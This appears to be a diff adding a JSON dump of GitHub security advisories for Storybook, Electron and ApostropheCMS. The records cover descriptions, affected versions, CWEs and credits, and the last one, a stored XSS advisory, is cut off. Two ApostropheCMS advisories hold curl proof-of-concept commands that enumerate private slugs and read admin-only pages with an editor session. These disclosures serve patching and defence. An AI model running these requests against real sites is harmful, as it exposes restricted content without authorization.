@@ -1,0 +1,2138 @@
+[
+  {
+    "ghsa_id": "GHSA-f2ph-cmg5-wxc8",
+    "cve_id": "CVE-2026-114125",
+    "url": "https://api.github.com/advisories/GHSA-f2ph-cmg5-wxc8",
+    "html_url": "https://github.com/advisories/GHSA-f2ph-cmg5-wxc8",
+    "summary": "Storybook: Missing origin validation in Storybook preview allows code injection from malicious websites",
+    "description": "**Summary:** A malicious website may be able to cause unauthorized file changes in a developer’s project while an affected Storybook development server is running. Under additional conditions, a changed file could be executed by a local runtime with the developer’s privileges. We are not aware of exploitation in the wild.\n\n## Who is impacted?\n\nYou are impacted if you run a Storybook dev server in the affected versions.\n\nYou are not impacted if:\n\n- You run a dev server that you never open in a web browser (e.g. headless automation, MCP clients)\n- You run or visit a built version of Storybook\n\nRecent versions of Chrome and Firefox may ask for permission before a website can connect to a `localhost` service. This reduces the risk, but does not remove it. Do not grant this permission to websites you don’t trust.\n\n## Recommended actions\n\n### Upgrade Storybook\n\nStorybook has released patched versions of all affected major Storybook versions that fix all the vulnerabilities necessary for the worst-case scenario above to occur. \n\nUpgrade to a patched version listed below before running `storybook dev` again. If you cannot upgrade immediately, do not run an affected Storybook dev server until you can apply the fix.\n\n- 11.0.0-alpha.6\n- 10.6.2\n- 9.1.21\n- 8.6.19\n\n### Review potentially breaking changes\n\nDue to the exceptional nature of the reported vulnerabilities, the Storybook team has decided to change the default behavior of Storybook, including versions 8 and 9, for several network-related features that are not essential to most Storybook users' workflow. If your team relies on the affected features, we've added feature flags that can disable specific security updates to support your existing workflows.\n\nPlease carefully read the introduced flags and the consequences of using them.\n\n#### Iframe embedding over the network is disabled by default\n\nStorybook no longer allows the manager or preview to be embedded as an iframe on a website with a different host name. Built versions of Storybook are unaffected and can be freely embedded.\n\nIf you rely on embedding a Storybook dev server through a separate web app, run that separate app on `localhost`. You may also use the `security.insecureRemoteIframeEmbed` feature flag to re-enable iframe embedding from any origin.\n\n#### The preview iframe rejects messages sent by an unknown host\n\nBoth the Storybook preview and manager now restrict the origin of iframes and parent windows that they can send messages to and receive messages from using the `postMessage` API.\n\nBy default, Storybook in dev mode only accepts communication with its own origin and other `localhost` services. Built Storybooks continue to accept communication from unknown origins.\n\nA Storybook addon or integration could hypothetically rely on `postMessage` to update a live story's args. If you do that, reach out to the Storybook team to explore safer alternatives.\n\nStorybook composition also relies on `postMessage`, so a composed Storybook on a different origin now fails to load unless it has been built. The `security.insecureIframeMessaging` feature flag disables this protection, but we recommend you build composed Storybooks instead.\n\n#### The `highlight` event signature has changed\n\nStorybook’s own accessibility addon uses the `highlight` event to inject highlights into the preview, which a user can click. Clicking the highlight opens a menu with a link to a documentation page.\n\nThe API for that event was too permissive and could be used to trigger arbitrary events, including events processed by the user’s dev server. We reworked the API to prevent abuse. Besides the accessibility addon, Chromatic's Visual Tests addon uses this API to link to documentation from highlighted ignored elements. Update the Visual Tests addon to version 5.5.1 or later to keep that link working. Because no other addons use this API as far as we know, we have not added a feature flag to restore the old API.\n\n## Disclosure timeline\n\nOn September 30th, the Storybook team received a responsible disclosure showing how a malicious website can embed a Storybook dev server's preview iframe and send events to the dev server on the developer's machine.\n\nThey combined this information with findings from an ongoing security audit to come up with a worst-case-scenario exploitation of the disclosed vulnerability, and the ones we independently discovered. They then worked to address all layers necessary for this worst-case scenario to happen. We have not received evidence of exploitation in real Storybook projects. The attack outlined in this advisory relies on correctly exploiting a sequence of many vulnerabilities, some of which were never disclosed to the Storybook team.\n\n### Worst-case attack scenario\n\nAn attacker-controlled website can interact with the preview of a running Storybook dev server. With user interaction, it may cause the dev server to make unauthorized changes to story files. If a malicious file is subsequently executed by a local runtime, the attack could lead to arbitrary code execution with the developer’s permissions.",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/storybookjs/storybook/security-advisories/GHSA-f2ph-cmg5-wxc8",
+    "source_code_location": "https://github.com/storybookjs/storybook",
+    "identifiers": [
+      {
+        "value": "GHSA-f2ph-cmg5-wxc8",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-114125",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/storybookjs/storybook/security/advisories/GHSA-f2ph-cmg5-wxc8",
+      "https://github.com/storybookjs/storybook/pull/36726",
+      "https://github.com/storybookjs/storybook/commit/243c06bf8f1e2f09446c44868ea100261e1374da",
+      "https://github.com/storybookjs/storybook/commit/3be03ec6f11f4616471cebc3fc65c13e1bf8c178",
+      "https://github.com/storybookjs/storybook/commit/a9ef9345d73224c73e0b81dc2701ec5b465ea9bb",
+      "https://github.com/storybookjs/storybook/commit/d9b09e332510a88689c71ecc081bbbc2d072476e",
+      "https://github.com/storybookjs/storybook/commit/df3fed468c9b4830605f00068c4bc6b7e1e215ed",
+      "https://github.com/storybookjs/storybook/releases/tag/v10.6.2",
+      "https://github.com/storybookjs/storybook/releases/tag/v11.0.0-alpha.6",
+      "https://github.com/storybookjs/storybook/releases/tag/v8.6.19",
+      "https://github.com/storybookjs/storybook/releases/tag/v9.1.21",
+      "https://github.com/advisories/GHSA-f2ph-cmg5-wxc8"
+    ],
+    "published_at": "2026-10-21T17:23:29Z",
+    "updated_at": "2026-10-21T17:23:30Z",
+    "github_reviewed_at": "2026-10-21T17:23:29Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "storybook"
+        },
+        "vulnerable_version_range": ">= 8.0.0, < 8.6.19",
+        "first_patched_version": "8.6.19",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "storybook"
+        },
+        "vulnerable_version_range": ">= 9.0.0, < 9.1.21",
+        "first_patched_version": "9.1.21",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "storybook"
+        },
+        "vulnerable_version_range": ">= 10.0.0, < 10.6.2",
+        "first_patched_version": "10.6.2",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "storybook"
+        },
+        "vulnerable_version_range": ">= 11.0.0-alpha.0, < 11.0.0-alpha.6",
+        "first_patched_version": "11.0.0-alpha.6",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "@storybook/core"
+        },
+        "vulnerable_version_range": ">= 8.0.0, < 8.6.19",
+        "first_patched_version": "8.6.19",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "@storybook/core-server"
+        },
+        "vulnerable_version_range": ">= 8.0.0, < 8.6.19",
+        "first_patched_version": "8.6.19",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "@storybook/experimental-addon-test"
+        },
+        "vulnerable_version_range": ">= 8.0.0, < 8.6.19",
+        "first_patched_version": "8.6.19",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "@storybook/addon-vitest"
+        },
+        "vulnerable_version_range": ">= 9.0.0, < 9.1.21",
+        "first_patched_version": "9.1.21",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "@storybook/addon-vitest"
+        },
+        "vulnerable_version_range": ">= 10.0.0, < 10.6.2",
+        "first_patched_version": "10.6.2",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "@storybook/addon-vitest"
+        },
+        "vulnerable_version_range": ">= 11.0.0-alpha.0, < 11.0.0-alpha.6",
+        "first_patched_version": "11.0.0-alpha.6",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "@storybook/addon-mcp"
+        },
+        "vulnerable_version_range": ">= 10.6.0, < 10.6.2",
+        "first_patched_version": "10.6.2",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "@storybook/addon-mcp"
+        },
+        "vulnerable_version_range": ">= 11.0.0-alpha.0, < 11.0.0-alpha.6",
+        "first_patched_version": "11.0.0-alpha.6",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": 0.0
+      },
+      "cvss_v4": {
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
+        "score": 9.4
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-22",
+        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+      },
+      {
+        "cwe_id": "CWE-94",
+        "name": "Improper Control of Generation of Code ('Code Injection')"
+      },
+      {
+        "cwe_id": "CWE-96",
+        "name": "Improper Neutralization of Directives in Statically Saved Code ('Static Code Injection')"
+      },
+      {
+        "cwe_id": "CWE-346",
+        "name": "Origin Validation Error"
+      },
+      {
+        "cwe_id": "CWE-441",
+        "name": "Unintended Proxy or Intermediary ('Confused Deputy')"
+      },
+      {
+        "cwe_id": "CWE-749",
+        "name": "Exposed Dangerous Method or Function"
+      },
+      {
+        "cwe_id": "CWE-862",
+        "name": "Missing Authorization"
+      },
+      {
+        "cwe_id": "CWE-1021",
+        "name": "Improper Restriction of Rendered UI Layers or Frames"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "agent-killjoy",
+          "id": 79434893,
+          "node_id": "MDQ6VXNlcjc5NDM0ODkz",
+          "avatar_url": "https://avatars.githubusercontent.com/u/79434893?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/agent-killjoy",
+          "html_url": "https://github.com/agent-killjoy",
+          "followers_url": "https://api.github.com/users/agent-killjoy/followers",
+          "following_url": "https://api.github.com/users/agent-killjoy/following{/other_user}",
+          "gists_url": "https://api.github.com/users/agent-killjoy/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/agent-killjoy/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/agent-killjoy/subscriptions",
+          "organizations_url": "https://api.github.com/users/agent-killjoy/orgs",
+          "repos_url": "https://api.github.com/users/agent-killjoy/repos",
+          "events_url": "https://api.github.com/users/agent-killjoy/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/agent-killjoy/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      },
+      {
+        "user": {
+          "login": "Sidnioulz",
+          "id": 5108577,
+          "node_id": "MDQ6VXNlcjUxMDg1Nzc=",
+          "avatar_url": "https://avatars.githubusercontent.com/u/5108577?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/Sidnioulz",
+          "html_url": "https://github.com/Sidnioulz",
+          "followers_url": "https://api.github.com/users/Sidnioulz/followers",
+          "following_url": "https://api.github.com/users/Sidnioulz/following{/other_user}",
+          "gists_url": "https://api.github.com/users/Sidnioulz/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/Sidnioulz/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/Sidnioulz/subscriptions",
+          "organizations_url": "https://api.github.com/users/Sidnioulz/orgs",
+          "repos_url": "https://api.github.com/users/Sidnioulz/repos",
+          "events_url": "https://api.github.com/users/Sidnioulz/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/Sidnioulz/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "coordinator"
+      },
+      {
+        "user": {
+          "login": "ghengeveld",
+          "id": 321738,
+          "node_id": "MDQ6VXNlcjMyMTczOA==",
+          "avatar_url": "https://avatars.githubusercontent.com/u/321738?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/ghengeveld",
+          "html_url": "https://github.com/ghengeveld",
+          "followers_url": "https://api.github.com/users/ghengeveld/followers",
+          "following_url": "https://api.github.com/users/ghengeveld/following{/other_user}",
+          "gists_url": "https://api.github.com/users/ghengeveld/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/ghengeveld/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/ghengeveld/subscriptions",
+          "organizations_url": "https://api.github.com/users/ghengeveld/orgs",
+          "repos_url": "https://api.github.com/users/ghengeveld/repos",
+          "events_url": "https://api.github.com/users/ghengeveld/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/ghengeveld/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "remediation_developer"
+      }
+    ],
+    "comments": 2,
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    }
+  },
+  {
+    "ghsa_id": "GHSA-fw47-9c62-h3vw",
+    "cve_id": "CVE-2026-113800",
+    "url": "https://api.github.com/advisories/GHSA-fw47-9c62-h3vw",
+    "html_url": "https://github.com/advisories/GHSA-fw47-9c62-h3vw",
+    "summary": "Electron: HID and USB permission checks can be attributed to the wrong origin",
+    "description": "### Impact\nFor `hid` and `usb` permission checks made from an iframe, `session.setPermissionCheckHandler` was given the top-level frame's origin and details instead of the requesting frame's. Apps that allow these permissions based on origin could grant an embedded frame access intended for the top-level page.\n\nYou're only affected if you use `setPermissionCheckHandler` with origin-based logic for `hid` or `usb` and embed cross-origin iframes with `allow=\"hid\"` or `allow=\"usb\"`. Apps that don't delegate those features to untrusted iframes are not affected.\n\n### Workarounds\nDon't add `allow=\"hid\"` / `allow=\"usb\"` to untrusted iframes, or make the decision in your `select-hid-device` / `select-usb-device` handler using `details.frame`.\n\n### Fixed Versions\n* `45.0.0-alpha.5`\n* `44.3.0`\n* `43.7.0`\n* `42.11.3`\n\n### For more information\nIf you have any questions or comments about this advisory, email us at [security@electronjs.org](mailto:security@electronjs.org)",
+    "type": "reviewed",
+    "severity": "medium",
+    "repository_advisory_url": "https://api.github.com/repos/electron/electron/security-advisories/GHSA-fw47-9c62-h3vw",
+    "source_code_location": "https://github.com/electron/electron",
+    "identifiers": [
+      {
+        "value": "GHSA-fw47-9c62-h3vw",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-113800",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/electron/electron/security/advisories/GHSA-fw47-9c62-h3vw",
+      "https://github.com/electron/electron/pull/53656",
+      "https://github.com/electron/electron/pull/53679",
+      "https://github.com/electron/electron/pull/53688",
+      "https://github.com/electron/electron/pull/53689",
+      "https://github.com/electron/electron/pull/53736",
+      "https://github.com/electron/electron/commit/22de0a3a06cfd3174fc6c59c3810ab5e1c91bf1a",
+      "https://github.com/electron/electron/commit/36042b2e1b1c60c67b05ba0e95d1a34f608b9742",
+      "https://github.com/electron/electron/commit/56cc43eb677d46b86b0d3f49b5fba71404ab1ff0",
+      "https://github.com/electron/electron/commit/922073f8601479e93071f56f0745041291b206fd",
+      "https://github.com/electron/electron/commit/c965cee73284c4b230a81d51a7db6115e55da8c0",
+      "https://github.com/electron/electron/releases/tag/v42.11.3",
+      "https://github.com/electron/electron/releases/tag/v43.7.0",
+      "https://github.com/electron/electron/releases/tag/v44.3.0",
+      "https://github.com/electron/electron/releases/tag/v45.0.0-alpha.5",
+      "https://github.com/advisories/GHSA-fw47-9c62-h3vw"
+    ],
+    "published_at": "2026-10-21T17:21:51Z",
+    "updated_at": "2026-10-21T17:21:53Z",
+    "github_reviewed_at": "2026-10-21T17:21:51Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "electron"
+        },
+        "vulnerable_version_range": ">= 45.0.0-alpha.1, < 45.0.0-alpha.5",
+        "first_patched_version": "45.0.0-alpha.5",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "electron"
+        },
+        "vulnerable_version_range": ">= 44.0.0-alpha.1, < 44.3.0",
+        "first_patched_version": "44.3.0",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "electron"
+        },
+        "vulnerable_version_range": ">= 43.0.0-alpha.1, < 43.7.0",
+        "first_patched_version": "43.7.0",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "electron"
+        },
+        "vulnerable_version_range": "< 42.11.3",
+        "first_patched_version": "42.11.3",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:N",
+        "score": 5.4
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-346",
+        "name": "Origin Validation Error"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "HuzaifaAbdulRehman",
+          "id": 143286445,
+          "node_id": "U_kgDOCIpgrQ",
+          "avatar_url": "https://avatars.githubusercontent.com/u/143286445?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/HuzaifaAbdulRehman",
+          "html_url": "https://github.com/HuzaifaAbdulRehman",
+          "followers_url": "https://api.github.com/users/HuzaifaAbdulRehman/followers",
+          "following_url": "https://api.github.com/users/HuzaifaAbdulRehman/following{/other_user}",
+          "gists_url": "https://api.github.com/users/HuzaifaAbdulRehman/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/HuzaifaAbdulRehman/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/HuzaifaAbdulRehman/subscriptions",
+          "organizations_url": "https://api.github.com/users/HuzaifaAbdulRehman/orgs",
+          "repos_url": "https://api.github.com/users/HuzaifaAbdulRehman/repos",
+          "events_url": "https://api.github.com/users/HuzaifaAbdulRehman/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/HuzaifaAbdulRehman/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "comments": 3,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:N",
+      "score": 5.4
+    }
+  },
+  {
+    "ghsa_id": "GHSA-f66c-mpj2-3r8h",
+    "cve_id": "CVE-2026-112952",
+    "url": "https://api.github.com/advisories/GHSA-f66c-mpj2-3r8h",
+    "html_url": "https://github.com/advisories/GHSA-f66c-mpj2-3r8h",
+    "summary": "ApostropheCMS: POST /api/v1/@apostrophecms/doc/slugTaken discloses existence of private/admin-only content to any authenticated user",
+    "description": "### Summary\nThe `slugTaken` endpoint returns a boolean indicating whether a slug is in use across\nall document types and visibility levels, with no permission or type filter. Any logged-in\nuser (including editors) can enumerate the slug space of private pages, drafts, and\narchived content.\n\n### Details\n`POST /api/v1/@apostrophecms/doc/slugTaken` with body `{ \"slug\": \"target-slug\" }` runs\na raw existence check against the documents collection. It does not:\n- Check whether the requesting user has read permission for documents of that type.\n- Filter by `visibility` (public, loginRequired, private).\n- Filter by `viewRole`.\n- Filter by publication status (draft vs published).\n\nA single authenticated session can iterate the slug space to enumerate the full content\ninventory of the CMS, including content the user is explicitly prohibited from viewing.\n\n### PoC\n```bash\n# Any authenticated session works — editor role sufficient\ncurl -b \"$EDITOR_JAR\" -X POST \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"slug\":\"known-private-page-slug\"}' \\\n  \"http://TARGET/api/v1/@apostrophecms/doc/slugTaken\"\n# → { \"taken\": true }  — confirms private page exists\n\ncurl -b \"$EDITOR_JAR\" -X POST \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"slug\":\"zzz-nonexistent\"}' \\\n  \"http://TARGET/api/v1/@apostrophecms/doc/slugTaken\"\n# → { \"taken\": false }\n```\n\n### Impact\nInformation disclosure. An attacker with any authenticated session can enumerate all\nslugs in the system, mapping the full content structure of the CMS including private and\nadmin-only content.",
+    "type": "reviewed",
+    "severity": "medium",
+    "repository_advisory_url": "https://api.github.com/repos/apostrophecms/apostrophe/security-advisories/GHSA-f66c-mpj2-3r8h",
+    "source_code_location": "https://github.com/apostrophecms/apostrophe",
+    "identifiers": [
+      {
+        "value": "GHSA-f66c-mpj2-3r8h",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-112952",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-f66c-mpj2-3r8h",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-112952",
+      "https://github.com/apostrophecms/apostrophe/commit/06e4b377f3c360f9e89c32dccd7e505ad5ddf498",
+      "https://github.com/apostrophecms/apostrophe/commit/40b989b1a9dd23d30029b8ce7668634265cfe5ea",
+      "https://github.com/apostrophecms/apostrophe/releases/tag/apostrophe@4.34.0",
+      "https://github.com/advisories/GHSA-f66c-mpj2-3r8h"
+    ],
+    "published_at": "2026-10-21T17:17:00Z",
+    "updated_at": "2026-10-21T17:17:02Z",
+    "github_reviewed_at": "2026-10-21T17:17:00Z",
+    "nvd_published_at": "2026-10-20T16:17:06Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "apostrophe"
+        },
+        "vulnerable_version_range": "< 4.34.0",
+        "first_patched_version": "4.34.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
+        "score": 4.3
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-200",
+        "name": "Exposure of Sensitive Information to an Unauthorized Actor"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "J4swanth",
+          "id": 283562532,
+          "node_id": "U_kgDOEObSJA",
+          "avatar_url": "https://avatars.githubusercontent.com/u/283562532?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/J4swanth",
+          "html_url": "https://github.com/J4swanth",
+          "followers_url": "https://api.github.com/users/J4swanth/followers",
+          "following_url": "https://api.github.com/users/J4swanth/following{/other_user}",
+          "gists_url": "https://api.github.com/users/J4swanth/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/J4swanth/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/J4swanth/subscriptions",
+          "organizations_url": "https://api.github.com/users/J4swanth/orgs",
+          "repos_url": "https://api.github.com/users/J4swanth/repos",
+          "events_url": "https://api.github.com/users/J4swanth/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/J4swanth/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "comments": 8,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
+      "score": 4.3
+    }
+  },
+  {
+    "ghsa_id": "GHSA-vh56-5m88-39rq",
+    "cve_id": "CVE-2026-112957",
+    "url": "https://api.github.com/advisories/GHSA-vh56-5m88-39rq",
+    "html_url": "https://github.com/advisories/GHSA-vh56-5m88-39rq",
+    "summary": "ApostropheCMS: GET /api/v1/@apostrophecms/page/:id bypasses viewRole restriction and exposes viewPermission-gated fields to lower-privileged users",
+    "description": "### Summary\nThe `getOne` REST endpoint for pages does not apply `viewRole` type-level restrictions\nor `viewPermission` field-level redaction. An editor-level user who knows a document\n`_id` can read the full content of admin-only pages and their privileged fields, while\nthe `getAll` endpoint correctly enforces both restrictions.\n\n### Details\n**Finding 3 — viewRole bypass:**\n`modules/@apostrophecms/page/index.js` exposes `getRestQuery(req, omitPermissionCheck =\nfalse)`. The `getAll` path calls `publicApiCheckAsync` and threads the full query builder\npipeline including `viewRole` filtering. The `getOne` path uses a divergent code path\nthat skips this pipeline.\n\nA page type declared with `viewRole: 'admin'` is inaccessible via `GET\n/api/v1/@apostrophecms/page?type=secretPage` (returns 403 to an editor) but is fully\nreturned by `GET /api/v1/@apostrophecms/page/:id:en:published` to the same editor.\n\n**Finding 4 — viewPermission field leak:**\nFields decorated with `viewPermission: { action: 'edit', type: '@apostrophecms/page' }`\nare stripped by `removeForbiddenFields` in the `getAll` path but are returned verbatim\nin `getOne`. An editor who knows any document `_id` can read all\n`viewPermission`-restricted fields.\n\n### PoC\n```bash\n# Log in as editor, get session jar\nEDITOR_JAR=\"...\"\n\n# getAll — correctly blocked\ncurl -b \"$EDITOR_JAR\" \\\n  \"http://TARGET/api/v1/@apostrophecms/page?type=secretPage\"\n# → 403 Forbidden\n\n# getOne — bypassed, returns full document including viewPermission fields\ncurl -b \"$EDITOR_JAR\" \\\n  \"http://TARGET/api/v1/@apostrophecms/page/ADMIN_PAGE_ID:en:published\"\n# → 200 OK, full doc including secretField value\n```\n\n### Impact\nEditors can read the full content of any page — including those restricted to admins via\n`viewRole` — if they know or can guess the `_id`. Sensitive field values gated by\n`viewPermission` are also fully exposed. This breaks the content access control model\nfor any site using these decorators.",
+    "type": "reviewed",
+    "severity": "medium",
+    "repository_advisory_url": "https://api.github.com/repos/apostrophecms/apostrophe/security-advisories/GHSA-vh56-5m88-39rq",
+    "source_code_location": "https://github.com/apostrophecms/apostrophe",
+    "identifiers": [
+      {
+        "value": "GHSA-vh56-5m88-39rq",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-112957",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-vh56-5m88-39rq",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-112957",
+      "https://github.com/apostrophecms/apostrophe/commit/06e4b377f3c360f9e89c32dccd7e505ad5ddf498",
+      "https://github.com/apostrophecms/apostrophe/commit/40b989b1a9dd23d30029b8ce7668634265cfe5ea",
+      "https://github.com/apostrophecms/apostrophe/releases/tag/apostrophe@4.34.0",
+      "https://github.com/advisories/GHSA-vh56-5m88-39rq"
+    ],
+    "published_at": "2026-10-21T17:15:21Z",
+    "updated_at": "2026-10-21T17:15:22Z",
+    "github_reviewed_at": "2026-10-21T17:15:21Z",
+    "nvd_published_at": "2026-10-20T17:17:33Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "apostrophe"
+        },
+        "vulnerable_version_range": "< 4.34.0",
+        "first_patched_version": "4.34.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
+        "score": 4.3
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-862",
+        "name": "Missing Authorization"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "harshavardhan98899-lab",
+          "id": 249544551,
+          "node_id": "U_kgDODt-_Zw",
+          "avatar_url": "https://avatars.githubusercontent.com/u/249544551?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/harshavardhan98899-lab",
+          "html_url": "https://github.com/harshavardhan98899-lab",
+          "followers_url": "https://api.github.com/users/harshavardhan98899-lab/followers",
+          "following_url": "https://api.github.com/users/harshavardhan98899-lab/following{/other_user}",
+          "gists_url": "https://api.github.com/users/harshavardhan98899-lab/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/harshavardhan98899-lab/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/harshavardhan98899-lab/subscriptions",
+          "organizations_url": "https://api.github.com/users/harshavardhan98899-lab/orgs",
+          "repos_url": "https://api.github.com/users/harshavardhan98899-lab/repos",
+          "events_url": "https://api.github.com/users/harshavardhan98899-lab/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/harshavardhan98899-lab/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "comments": 5,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
+      "score": 4.3
+    }
+  },
+  {
+    "ghsa_id": "GHSA-7jg5-frgc-c67w",
+    "cve_id": "CVE-2026-112958",
+    "url": "https://api.github.com/advisories/GHSA-7jg5-frgc-c67w",
+    "html_url": "https://github.com/advisories/GHSA-7jg5-frgc-c67w",
+    "summary": "ApostropheCMS: Stored XSS via Unescaped Widget Style Attribute Serialization",
+    "description": "## Summary\n\nApostropheCMS widget styles support project-defined schema fields. If a project defines a free-form `string` style field with a CSS `property` and no selector, an editor-controlled value is rendered as an inline CSS declaration. The resulting declaration is then inserted into the widget wrapper's `style=\"...\"` attribute without HTML-attribute escaping.\n\nAn attacker who can edit the widget can include a double quote in the style value, terminate the `style` attribute, and inject new HTML event-handler attributes. The payload is stored with the widget and executes in the Apostrophe site origin whenever the affected published page is rendered.\n\nThis is a sibling of CVE-2026-33889 / `GHSA-97v6-998m-fp4g`. The earlier issue escaped from a `<style>` element through a malicious color value. This variant reaches a different sink related to the automatically generated widget wrapper's inline `style` and `class` attributes.\n\n## Details\n\n### Root Cause 1: Free-form string style values retain HTML metacharacters\n\nThe standard string field converter uses `launder.string()` and length validation. This performs type normalization, not output encoding for an HTML attribute 